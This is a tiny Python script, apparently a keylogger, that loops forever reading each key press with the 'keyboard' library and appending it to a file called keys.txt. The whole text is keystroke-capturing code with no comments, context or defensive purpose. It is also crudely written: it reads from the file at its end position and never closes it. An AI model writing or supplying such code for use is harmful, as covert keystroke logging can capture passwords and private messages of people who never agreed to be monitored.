import keyboard

file = open('keys.txt', 'w+', encoding='utf-8')
while True:
    old = file.read()
    text = keyboard.read_key()
    file.write(old + text)